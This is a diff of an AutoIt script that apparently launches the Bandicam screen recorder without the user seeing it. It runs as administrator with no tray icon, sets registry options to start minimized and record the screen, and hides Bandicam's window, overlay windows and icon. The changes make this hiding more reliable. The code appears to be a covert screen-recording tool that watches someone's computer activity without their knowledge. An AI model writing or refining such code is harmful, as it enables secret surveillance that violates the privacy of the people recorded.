@@ -1,16 +1,13 @@
 #NoTrayIcon
 #RequireAdmin
+#include-once
+
 #Region ;**** Directives created by AutoIt3Wrapper_GUI ****
-#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
 #AutoIt3Wrapper_Run_Tidy=y
 #Tidy_Parameters=/sci 1
 #AutoIt3Wrapper_Run_Au3Stripper=y
 #Au3Stripper_Parameters=/rm /sf=1 /sv=1 /mi
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
-#include-once
-
-#Region
-#EndRegion
 
 #include <WinAPIProc.au3>
 #include <Misc.au3>
@@ -266,7 +263,9 @@ RegWrite($sKey, "bVideoHotkey", "REG_DWORD", 0)
 RegWrite($sKey, "bStartMinimized", "REG_DWORD", 1)
 RegWrite($sKey, "nTargetMode", "REG_DWORD", 1)
 RegWrite($sKey, "nTargetFullOpacity", "REG_DWORD", 20)
+RegWrite($sKey, "nTargetOpacity", "REG_DWORD", 20)
 RegWrite($sKey, "bTargetFullPinnedUp", "REG_DWORD", 1)
+RegWrite($sKey, "nScreenRecordingSubMode", "REG_DWORD", 1)
 
 If $bIsXP = True Then
 	RegWrite($sKey, "bVideoHotkey", "REG_DWORD", 1)
@@ -337,14 +336,11 @@ Func GetAllWindHandle()
 			Local $cHandle = $aList[$i][1]
 			Local $cTitle = $aList[$i][0]
 			Local $aPos = WinGetPos($cHandle)
-			Local $iX = $aPos[0]
 			Local $iY = $aPos[1]
 			Local $iW = $aPos[2]
 			Local $iH = $aPos[3]
 
-			If $bIsXP = True And $iX = 0 And $iY = 0 And $iH < 50 Then
-				AddInHandleList($cHandle)
-			ElseIf $iH < 50 And $iX > 0 And $iY = 0 And $cTitle = "" And $iW > 0 Then
+			If $iY = 0 And $iH > 0 And $iH < 50 And $iW > 0 And $cTitle = "" Then
 				AddInHandleList($cHandle)
 			EndIf
 		EndIf
@@ -353,6 +349,9 @@ EndFunc   ;==>GetAllWindHandle
 
 Func HideWindows()
 	WinSetState($hWinBandicam, "", @SW_HIDE)
+
+	If UBound($aHandles) = 1 Then Return
+
 	For $i = 1 To $aHandles[0]
 		WinSetState($aHandles[$i], "", @SW_HIDE)
 	Next
@@ -366,11 +365,13 @@ Func CheckBandyCam()
 		$hWinBandicam = WinGetHandle($sBandicanClass)
 		Local $aTmp[1] = [0]
 		$aHandles = $aTmp
+		Sleep(1000)
 		ResetVars()
 		GetAllWindHandle()
 		HideWindows()
-		HideIcon()
 	EndIf
+
+	HideIcon()
 EndFunc   ;==>CheckBandyCam
 
 Func UserIsActive()
